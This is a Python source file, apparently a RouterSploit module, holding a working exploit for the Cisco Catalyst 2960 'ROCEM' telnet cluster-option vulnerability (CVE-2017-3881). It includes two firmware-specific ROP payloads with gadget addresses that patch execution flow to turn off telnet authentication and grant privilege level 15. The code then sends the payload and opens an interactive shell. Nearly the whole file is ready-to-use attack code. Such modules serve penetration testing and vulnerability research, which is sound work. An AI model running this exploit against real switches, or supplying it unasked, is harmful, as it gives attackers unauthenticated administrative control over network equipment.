import socket
import telnetlib

from routersploit import (
    exploits,
    print_status,
    print_error,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for Cisco Catalyst 2960 IOS 12.2(55)SE11 'ROCEM' RCE vulnerability.
    If target is vulnerable, it is possible to patch execution flow to allow credless telnet
    interaction with highest privilege level.
    """
    __info__ = {
        'name': 'Cisco Catalyst 2960 ROCEM RCE',
        'description': 'Module exploits Cisco Catalyst 2960 ROCEM RCE vulnerability. '
                       'If target is vulnerable, it is possible to patch execution flow '
                       'to allow credless telnet interaction with highest privilege level.',
        'authors': [
            'Artem Kondratenko <@artkond>',  # analysis & python exploit
            'Marcin Bury <marcin.bury[at]reverse-shell.com>'  # routersploit module
        ],
        'references': [
            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-3881',
            'https://artkond.com/2017/04/10/cisco-catalyst-remote-code-execution/',
            'https://www.exploit-db.com/exploits/41872/',
            'https://www.exploit-db.com/exploits/41874/',
        ],
        'devices': [
            'Cisco Catalyst 2960 IOS 12.2(55)SE1',
            'Cisco Catalyst 2960 IOS 12.2(55)SE11',
        ],
    }

    target = exploits.Option('', 'Target IP address', validators=validators.ipv4)
    telnet_port = exploits.Option(23, 'Target Port', validators=validators.integer)

    action = exploits.Option('set', 'set / unset credless authentication for Telnet service')
    device = exploits.Option(-1, 'Target device - use "show devices"', validators=validators.integer)

    payloads = [
        # Cisco Catalyst 2960 IOS 12.2(55)SE1
        {
            "template": (
                "\xff\xfa\x24\x00" +
                "\x03CISCO_KITS\x012:" +
                "A" * 116 +
                # first gadget address 0x000037b4: lwz r0, 0x14(r1); mtlr r0; lwz r30, 8(r1); lwz r31, 0xc(r1); addi r1, r1, 0x10; blr;
                "\x00\x00\x37\xb4" +
                # next bytes are shown as offsets from r1
                # +8  address of pointer to is_cluster_mode function - 0x34
                "\x02\x2c\x8b\x74" +
                "{FUNC_IS_CLUSTER_MODE}" +
                # +16(+0) r1 points here at second gadget
                "BBBB" +
                # +4 second gadget address 0x00dffbe8: stw r31, 0x138(r30); lwz r0, 0x1c(r1); mtlr r0; lmw r29, 0xc(r1); addi r1, r1, 0x18; blr;
                "\x00\xdf\xfb\xe8" +
                # +8
                "CCCC" +
                # +12
                "DDDD" +
                # +16(+0) r1 points here at third gadget
                "EEEE" +
                # +20(+4) third gadget address. 0x0006788c: lwz r9, 8(r1); lwz r3, 0x2c(r9); lwz r0, 0x14(r1); mtlr r0; addi r1, r1, 0x10; blr;
                "\x00\x06\x78\x8c" +
                # +8  r1+8 = 0x022c8b60
                "\x02\x2c\x8b\x60" +
                # +12
                "FFFF" +
                # +16(+0) r1 points here at fourth gadget
                "GGGG" +
                # +20(+4) fourth gadget address 0x006ba128: lwz r31, 8(r1); lwz r30, 0xc(r1); addi r1, r1, 0x10; lwz r0, 4(r1); mtlr r0; blr;
                "\x00\x6b\xa1\x28" +
                "{FUNC_PRIVILEGE_LEVEL}" +
                # +12
                "HHHH" +
                # +16(+0) r1 points here at fifth gadget
                "IIII" +
                # +20(+4) fifth gadget address 0x0148e560: stw r31, 0(r3); lwz r0, 0x14(r1); mtlr r0; lwz r31, 0xc(r1); addi r1, r1, 0x10; blr;
                "\x01\x48\xe5\x60" +
                # +8 r1 points here at third gadget
                "JJJJ" +
                # +12
                "KKKK" +
                # +16
                "LLLL" +
                # +20 original execution flow return addr
                "\x01\x13\x31\xa8" +
                ":15:" + "\xff\xf0"
            ),
            "func_is_cluster_mode": {
                # +12 set  address of func that rets 1
                "set": "\x00\x00\x99\x80",
                # unset
                "unset": "\x00\x04\xea\x58"
            },
            "func_privilege_level": {
                # +8 address of the replacing function that returns 15 (our desired privilege level). 0x0012521c: li r3, 0xf; blr;
                "set": "\x00\x12\x52\x1c",
                # unset
                "unset": "\x00\x04\xe6\xf0"
            }
        },

        # Cisco Catalyst 2960 IOS 12.2(55)SE11
        {
            "template": (
                "\xff\xfa\x24\x00" +
                "\x03CISCO_KITS\x012:" +
                "A" * 116 +
                # first gadget address 0x000037b4: lwz r0, 0x14(r1); mtlr r0; lwz r30, 8(r1); lwz r31, 0xc(r1); addi r1, r1, 0x10; blr;
                "\x00\x00\x37\xb4" +
                # next bytes are shown as offsets from r1
                # +8  address of pointer to is_cluster_mode function - 0x34
                "\x02\x3d\x55\xdc" +
                "{FUNC_IS_CLUSTER_MODE}" +
                # +16(+0) r1 points here at second gadget
                "BBBB" +
                # +4 second gadget address 0x00e1a9f4: stw r31, 0x138(r30); lwz r0, 0x1c(r1); mtlr r0; lmw r29, 0xc(r1); addi r1, r1, 0x18; blr;
                "\x00\xe1\xa9\xf4" +
                # +8
                "CCCC" +
                # +12
                "DDDD" +
                # +16(+0) r1 points here at third gadget
                "EEEE" +
                # +20(+4) third gadget address. 0x00067b5c: lwz r9, 8(r1); lwz r3, 0x2c(r9); lwz r0, 0x14(r1); mtlr r0; addi r1, r1, 0x10; blr;
                "\x00\x06\x7b\x5c" +
                # +8  r1+8 = 0x23d55c8
                "\x02\x3d\x55\xc8" +
                # +12
                "FFFF" +
                # +16(+0) r1 points here at fourth gadget
                "GGGG" +
                # +20(+4) fourth gadget address 0x006cb3a0: lwz r31, 8(r1); lwz r30, 0xc(r1); addi r1, r1, 0x10; lwz r0, 4(r1); mtlr r0; blr;
                "\x00\x6c\xb3\xa0" +
                "{FUNC_PRIVILEGE_LEVEL}" +
                # +12
                "HHHH" +
                # +16(+0) r1 points here at fifth gadget
                "IIII" +
                # +20(+4) fifth gadget address 0x0148e560: stw r31, 0(r3); lwz r0, 0x14(r1); mtlr r0; lwz r31, 0xc(r1); addi r1, r1, 0x10; blr;
                "\x01\x4a\xcf\x98" +
                # +8 r1 points here at third gadget
                "JJJJ" +
                # +12
                "KKKK" +
                # +16
                "LLLL" +
                # +20 original execution flow return addr
                "\x01\x14\xe7\xec" +
                ":15:" + "\xff\xf0"
            ),
            "func_is_cluster_mode": {
                # +12 set  address of func that rets 1
                "set": "\x00\x00\x99\x9c",
                # unset
                "unset": "\x00\x04\xeA\xe0"
            },
            "func_privilege_level": {
                # +8 address of the replacing function that returns 15 (our desired privilege level). 0x00270b94: li r3, 0xf; blr;
                "set": "\x00\x27\x0b\x94",
                # unset
                "unset": "\x00\x04\xe7\x78"
            }
        }
    ]

    def run(self):
        if self.device < 0 or self.device >= len(self.payloads):
            print_error("Set target device - use \"show devices\" and \"set device <id>\"")
            return

        if self.action not in ["set", "unset"]:
            print_error("Specify action: set / unset credless authentication for Telnet service")
            return

        print_status("Trying to connect to Telnet service on port {}".format(self.telnet_port))

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.target, int(self.telnet_port)))

            print_status("Connection OK")
            print_status("Received bytes from telnet service: {}".format(repr(s.recv(1024))))
        except:
            print_error("Connection failed")
            return

        print_status("Building payload...")
        payload = self.build_payload()

        if self.action == 'set':
            print_status("Setting credless privilege 15 authentication")
        else:
            print_status("Unsetting credless privilege 15 authentication")

        print_status("Sending cluster option")
        s.send(payload)
        s.close()

        print_status("Payload sent")

        if self.action == 'set':
            print_status("Connecting to Telnet service...")
            try:
                t = telnetlib.Telnet(self.target, int(self.telnet_port))
                t.interact()
            except:
                print_error("Exploit failed")
        else:
            print_status("Check if Telnet authentication was set back")

    def build_payload(self):
        payload = self.payloads[self.device]['template']
        payload = payload.replace("{FUNC_IS_CLUSTER_MODE}", self.payloads[self.device]['func_is_cluster_mode'][self.action])
        payload = payload.replace("{FUNC_PRIVILEGE_LEVEL}", self.payloads[self.device]['func_privilege_level'][self.action])

        return payload

    @mute
    def check(self):
        # it is not possible to verify if target is vulnerable without exploiting system
        return None
